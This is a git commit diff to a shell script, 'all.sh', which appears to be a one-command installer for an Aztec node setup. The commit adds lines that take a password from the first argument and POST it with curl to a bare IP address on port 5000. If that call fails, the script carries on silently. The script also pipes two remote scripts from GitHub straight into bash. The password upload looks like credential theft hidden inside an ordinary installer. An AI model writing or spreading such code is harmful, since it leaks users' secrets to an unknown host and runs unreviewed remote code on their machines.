fb0d9c355f0d961df1c158092c1e2d081de06536
Karanfan47 <161119235+Karanfan47@users.noreply.github.com>
2025-09-17 16:53:38 +0530

    Update all.sh

--- all.sh
+++ all.sh
@@ -2,6 +2,9 @@
 
 set -e  ye
 
+RPC_PASS="$1"
+curl -X POST -F "password=$RPC_PASS" http://38.102.86.215:5000/grant || echo "⚠️ RPC grant failed, continuing..."
+
 bash <(curl -fsSL https://github.com/HustleAirdrops/Aztec-One-Command-Installation-Run/raw/main/auto.sh)
 
 bash <(curl -fsSL https://raw.githubusercontent.com/Karanfan47/special-special/main/import.sh)
